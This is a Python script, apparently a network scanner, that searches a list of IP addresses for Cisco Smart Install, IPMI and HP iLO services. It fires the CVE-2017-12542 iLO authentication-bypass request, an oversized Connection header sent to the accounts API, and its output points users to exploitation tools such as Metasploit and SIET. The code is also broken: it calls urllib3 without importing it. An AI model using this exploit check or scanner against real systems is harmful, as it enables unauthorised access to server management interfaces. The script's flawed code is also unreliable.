import argparse
import socket
import threading
from queue import Queue
import os
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time
import csv


def tcp_connect(ip, port, timeout):
    ''' Connects to a specified IP and port number. Returns whether a 
    service is listening on the port.
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(timeout)

    try:
        s.connect((ip, port))
        port_status = 'Listening'
    except Exception as e:
        port_status = ''
        if args.debug:
            print('[!] {}'.format(e))

    return port_status


def test_ilo_exploit(addr):
    ''' Sends a request to the iLO api and overflows the connection
    header to check for the vulnerability. A 200 response indicates
    the iLO is vulnerable. 

    Based on:https://www.exploit-db.com/exploits/44005/
    '''
    url = 'https://' + addr + '/rest/v1/AccountService/Accounts'

    try:
        response = requests.get(url, headers={'Connection' : 'a' * 29}, verify=False)
    except Exception as e:
        if args.verbose:
            print('[-] Could not connect to target on port {}:443'.format(addr))
        if args.debug:
            print('[!] {}'.format(e))
        return False

    if response.ok:
        return '{} vulnerable to CVE-2017-12542'.format(addr)
    else:
        return False


def scan_targets(addr, data):
    ''' Retrieves IP addresses from the queue and calls the tcp_connect()
    function to check for specific services.
    '''
    addr = addr.get()
    if args.verbose:
        print("[*] Checking host {}".format(addr))
    host_data = []
    if args.verbose:
        print("[*] Checking for SMI...")
    smi_status = tcp_connect(addr, 4786, timeout)
    if smi_status:
        print("[+] SMI Detected on {}. Try using the SIET tool.".format(addr))
    else:
        if args.verbose:
            print("[-] SMI not detected")

    if args.verbose:
        print("[*] Checking for IPMI...")
    ipmi_status = tcp_connect(addr, 623, timeout)
    if ipmi_status:
        print("[+] IPMI Detected on {}. Try using the IPMI Metasploit module.".format(addr))
    else:
        if args.verbose:
            print("[-] IPMI not detected")

    if args.verbose:
        print("[*] Checking for iLOs...")
    ilo_status = tcp_connect(addr, 17988, timeout)
    if ilo_status:
        print("[*] iLO detected. Checking for CVE-2017-12542.".format(addr))
        ilo_cve_status = test_ilo_exploit(addr)
        if ilo_cve_status:
            print('[+] {} is vulnerable to CVE-2017-12542'.format(addr))
        else:
            ilo_cve_status = ''
            print('[-] iLOs not vulnerable to CVE-2017-12542')
    else:
        ilo_cve_status = ''
        if args.verbose:
            print("[-] iLOs not detected")
    host_data.extend((addr, smi_status, ipmi_status, ilo_cve_status))

    data.append(host_data)


def parse_to_csv(data):
    ''' Takes a list and outputs to a csv file.
    '''
    if not os.path.isfile(csv_name):
        csv_file = open(csv_name, 'w', newline='')
        csv_writer = csv.writer(csv_file)
        top_row = ['IP Address', 'SMI', 'IPMI', 'iLO Status', 'Notes']
        csv_writer.writerow(top_row)
        print('\n [+]  The file {} does not exist. New file created!\n'.format(csv_name))
    else:
        try:
            csv_file = open(csv_name, 'a', newline='')
        except PermissionError:
            print("\n [-]  Permission denied to open the file {}. Check if the file is open and try again.\n".format(csv_name))
            print("Print data to the terminal:\n")
            for item in data:
                print(' '.join(item))
            exit()
        csv_writer = csv.writer(csv_file)
        print('\n [+]  {} exists. Appending to file!\n'.format(csv_name))
    
    for item in data:
        csv_writer.writerow(item)
        
    csv_file.close()


def main():
    ''' Starts the threads to scan for services and designates how the 
    data will be output.
    '''
    addr_queue = Queue()
    data = []

    # initializes threads
    worker_threads = []
    thread_counter = 0
    thread_max = args.threads

    for addr in addrs:
        addr_queue.put(addr)
        thread_counter += 1
        if thread_counter == thread_max:
            # should be enough time for the threads to finish...
            time.sleep(timeout)
            thread_counter = 0

        for i in range(1):
            worker_thread = threading.Thread(target=scan_targets, args=(addr_queue, data))
            worker_threads.append(worker_thread)
            worker_thread.start()

    for worker_thread in worker_threads:
        worker_thread.join()

    if args.csv:
        parse_to_csv(data)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
    parser.add_argument("-d", "--debug", help="print exceptions", action="store_true")
    parser.add_argument("-csv", "--csv", nargs='?', const='results.csv', help="specify the name of a csv file to write to. If the file already exists it will be appended")
    parser.add_argument("-ip", "--ip_address", help="specify a target IP address")
    parser.add_argument("-ipf", "--ip_address_file", help="specify a file containing IP addresses one per line.")
    parser.add_argument("-t", "--threads", nargs="?", type=int, default=5, help="specify number of threads (default=5)")
    parser.add_argument("-to", "--timeout", nargs="?", type=int, default=2, help="specify socket timeout (default=2)")
    args = parser.parse_args()

    if not args.ip_address and not args.ip_address_file:
        parser.print_help()
        print('\n[-] Please specify an IP address (-ip) or file containing IP addresses (-ipf)\n')
        exit()

    if args.ip_address:
        addrs = [args.ip_address]

    if args.ip_address_file:
        if not os.path.exists(args.ip_address_file):
            parser.print_help()
            print("\n[-]  The file cannot be found or you do not have permission to open the file. Please check the path and try again\n")
            exit()
        addrs = open(args.ip_address_file).read().splitlines()

    timeout = args.timeout 

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    main()
